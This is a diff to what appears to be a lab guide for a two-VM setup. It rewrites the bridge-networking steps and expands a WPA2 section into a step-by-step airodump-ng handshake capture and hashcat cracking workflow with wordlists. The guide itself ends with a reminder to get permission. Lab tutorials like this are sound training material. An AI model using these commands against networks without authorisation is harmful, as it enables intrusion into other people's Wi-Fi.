@@ -35,19 +35,10 @@ Both VMs should be connected using a **network adapter** configured as follows:
    *Replace `<interface_name>` with the correct network interface (e.g., wlan0).*
 
 ### For Wired Interfaces (Bridge Mode)
-1. Create a network bridge:
-   ```bash
-   sudo brctl addbr bridge0
-   ```
-2. Add your network interface to the bridge:
-   ```bash
-   sudo brctl addif bridge0 <interface_name>
-   ```
-3. Bring up the bridge:
-   ```bash
-   sudo ifconfig bridge0 up
-   ```
-
+1. Open your VM settings.
+2. Navigate to the Network Preferences section.
+3. Change the adapter type to Bridged Mode.
+    
 ---
 
 ## Using Bettercap for MITM (with PCAP File)
@@ -119,21 +110,55 @@ Check inside directories categorized by file type (e.g., jpg, gif, png, etc.).
 
 ## WPA2 4-Way Handshake Cracking
 
-### Step 1: Capture WPA2 Handshake
-1. Start monitoring mode:
-   ```bash
-   sudo airmon-ng start wlan0
-   ```
-2. Start capturing packets:
-   ```bash
-   sudo airodump-ng -c <channel> --bssid <router_BSSID> -w handshake_capture wlan0mon
-   ```
-   *Replace `<channel>` with the router’s channel and `<router_BSSID>` with the target’s MAC address.*
+Note: Make sure that your VM is in **Bridged Mode**
 
-### Step 2: Crack the WPA2 Key
-Use Aircrack-ng with a wordlist:
+### 1. Capture the WPA2 Handshake
+Use `airodump-ng` to capture the 4-way handshake, which results in a .cap or .pcap file:
 ```bash
-sudo aircrack-ng -w <wordlist> -b <router_BSSID> handshake_capture.cap
+sudo airodump-ng -c <channel> --bssid <router_BSSID> -w handshake_capture wlan0mon
 ```
-*Replace `<wordlist>` with a password list and `<router_BSSID>` with the target’s MAC.*
+The output file will be `handshake_capture.cap`.
 
+### 2. Convert the Handshake for Hashcat
+Hashcat requires a converted format (.hccapx or .22000).
+
+#### Option A: Convert to .hccapx
+```bash
+cap2hccapx handshake_capture.cap handshake_converted.hccapx
+```
+
+#### Option B: Convert to .22000
+```bash
+hcxpcapngtool -o handshake_converted.22000 handshake_capture.cap
+```
+
+### 3. Run Hashcat on the Converted File
+For an .hccapx file, use mode 2500:
+```bash
+hashcat -m 2500 handshake_converted.hccapx <path_to_wordlist>
+```
+For a .22000 file, use mode 22000:
+```bash
+hashcat -m 22000 handshake_converted.22000 <path_to_wordlist>
+```
+
+### 4. Tweak Hashcat Parameters
+```bash
+hashcat -m 22000 handshake_converted.22000 /usr/share/wordlists/rockyou.txt \
+  --force --potfile-path=cracked.pot --status --status-timer=30
+```
+- `--force`: Bypass some warnings (use with caution).
+- `--potfile-path`: Save found passwords.
+- `--status`: Show status updates.
+- `--status-timer=30`: Update status every 30 seconds.
+
+### 5. Review Cracked Passwords
+```bash
+hashcat --show -m 22000 handshake_converted.22000
+```
+
+### 6. Tips & Notes
+- Ensure GPU drivers (NVIDIA, AMD) and OpenCL/CUDA are installed.
+- Use large wordlists like `rockyou.txt` for better results.
+- Monitor GPU usage with `nvidia-smi` or `radeontop`.
+- Ensure you have explicit permission before testing any WPA networks.
